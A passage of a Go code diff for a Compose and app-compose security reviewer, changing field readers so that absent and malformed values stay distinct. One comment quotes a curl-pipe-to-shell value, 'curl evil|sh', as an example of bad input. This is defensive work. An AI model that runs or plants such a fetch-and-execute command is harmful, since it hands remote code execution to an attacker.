 // reviewSharedMounts reports the sources held by more than one service. A writable
@@ -932,11 +1305,16 @@ func parseMount(n *yaml.Node) (src, target string, readOnly, ok bool) {
 
 	case n.Kind == yaml.MappingNode:
 		// Long syntax. A bind with no source (type: tmpfs / volume) is legitimate and
-		// comes back as an anonymous mount.
-		src = strings.TrimSpace(nodeScalar(mapValue(n, "source")))
-		target = strings.TrimSpace(nodeScalar(mapValue(n, "target")))
+		// comes back as an anonymous mount — but a source or target that is present and
+		// NOT a scalar makes the whole entry unreadable, which the caller reports. Reading
+		// it as an anonymous mount would drop the finding.
+		srcVal, srcOK := nodeScalar(mapValue(n, "source"))
+		targetVal, targetOK := nodeScalar(mapValue(n, "target"))
+		if !srcOK || !targetOK {
+			return "", "", false, false
+		}
 		readOnly, _ = nodeBool(mapValue(n, "read_only"))
-		return src, target, readOnly, true
+		return strings.TrimSpace(srcVal), strings.TrimSpace(targetVal), readOnly, true
 
 	default:
 		return "", "", false, false
@@ -965,10 +1343,13 @@ func classifyOrigin(image string) ImageOrigin {
 
 // --- small readers -------------------------------------------------------------
 //
-// Each of these answers "what does this node/field say", and each returns a zero
-// value for a shape it cannot read. That is safe only because every CALLER that acts
-// on a negative also handles the unreadable case explicitly (see reviewServiceKey) —
-// these must never become the place a wrong shape turns into "not set".
+// EVERY reader that can fail returns an `ok`, and ABSENT is not a failure: a missing
+// node or field comes back as (zero, true), a present-but-wrong-shape one as (zero,
+// false). The two must be separate return values rather than one zero value, because
+// the whole review rests on never confusing them — `privileged: sort-of` and no
+// `privileged:` at all produce the same zero, and a reader that collapsed them would
+// hand every rule a silent way to pass. The compiler enforces the discipline: there is
+// no single-value form of these to call by accident.
 
 func mapValue(n *yaml.Node, key string) *yaml.Node {
 	if n == nil || n.Kind != yaml.MappingNode {
@@ -980,6 +1361,22 @@ func mapValue(n *yaml.Node, key string) *yaml.Node {
 		}
 	}
 	return nil
+}
+
+// declaredExternal reports whether a volume, secret, config or network declaration says
+// it is external — i.e. this manifest does not create it, so its contents are whatever
+// already exists on the host under that name.
+//
+// `external: true` and the long `external: {name: …}` form both mean external, and a
+// shape this cannot read is treated as external too: the lenient reading here would be
+// "the manifest creates it", which is the claim that makes the finding disappear.
+func declaredExternal(decl *yaml.Node) bool {
+	e := mapValue(decl, "external")
+	if e == nil {
+		return false
+	}
+	ext, ok := nodeBool(e)
+	return !ok || ext
 }
 
 // nodeHasContent reports whether the node carries anything. The presence-only rules use
@@ -1010,19 +1407,26 @@ func isRelativeBind(src string) bool {
 		strings.Contains(src, "/../") || strings.HasSuffix(src, "/..")
 }
 
-func nodeScalar(n *yaml.Node) string {
-	if n == nil || n.Kind != yaml.ScalarNode {
-		return ""
+// nodeScalar reads a scalar node. ok is false when the node is PRESENT but is not a
+// scalar — `pid: [host]`, `network_mode: {mode: host}` — which is the case that used to
+// read as absent and take the rule with it.
+func nodeScalar(n *yaml.Node) (val string, ok bool) {
+	if n == nil {
+		return "", true
 	}
-	return strings.TrimSpace(n.Value)
+	if n.Kind != yaml.ScalarNode {
+		return "", false
+	}
+	return strings.TrimSpace(n.Value), true
 }
 
-// nodeBool reports the node's boolean value. ok is false for a missing node AND for a
-// node that is not a boolean, and callers must distinguish the two themselves — a
-// missing `privileged` is absent, an unparseable one is unknown.
+// nodeBool reads a boolean node, on the same contract as the readers above: a missing
+// node is (false, true) — absent, and readably so — while a node that is present and is
+// not a boolean is (false, false). The two used to share ok=false here, which is the
+// exact conflation this section exists to prevent.
 func nodeBool(n *yaml.Node) (val, ok bool) {
 	if n == nil {
-		return false, false
+		return false, true
 	}
 	var b bool
 	if err := n.Decode(&b); err != nil {
@@ -1056,28 +1460,42 @@ func has(fields map[string]json.RawMessage, key string) bool {
 	return ok
 }
 
-func jsonString(raw json.RawMessage) string {
+// jsonString, jsonStrings and jsonBool follow nodeScalar's contract on the app-compose
+// side: an absent field is (zero, true), a field of the wrong JSON type is (zero,
+// false). `kms_enabled: "true"`, `public_logs: 1` and
+// `pre_launch_script: ["curl evil|sh"]` are all the second case — and the last of those
+// is root TCB, so reading it as absent is the most expensive version of this mistake.
+func jsonString(raw json.RawMessage) (val string, ok bool) {
+	if len(raw) == 0 || string(raw) == "null" {
+		return "", true
+	}
 	var s string
-	if len(raw) == 0 || json.Unmarshal(raw, &s) != nil {
-		return ""
+	if json.Unmarshal(raw, &s) != nil {
+		return "", false
 	}
-	return s
+	return s, true
 }
 
-func jsonStrings(raw json.RawMessage) []string {
+func jsonStrings(raw json.RawMessage) (val []string, ok bool) {
+	if len(raw) == 0 || string(raw) == "null" {
+		return nil, true
+	}
 	var s []string
-	if len(raw) == 0 || json.Unmarshal(raw, &s) != nil {
-		return nil
+	if json.Unmarshal(raw, &s) != nil {
+		return nil, false
 	}
-	return s
+	return s, true
 }
 
-func jsonBool(raw json.RawMessage) bool {
-	var b bool
-	if len(raw) == 0 || json.Unmarshal(raw, &b) != nil {
-		return false
+func jsonBool(raw json.RawMessage) (val, ok bool) {
+	if len(raw) == 0 || string(raw) == "null" {
+		return false, true
 	}
-	return b
+	var b bool
+	if json.Unmarshal(raw, &b) != nil {
+		return false, false
+	}
+	return b, true
 }
 
 func sortedKeys(m map[string]json.RawMessage) []string {
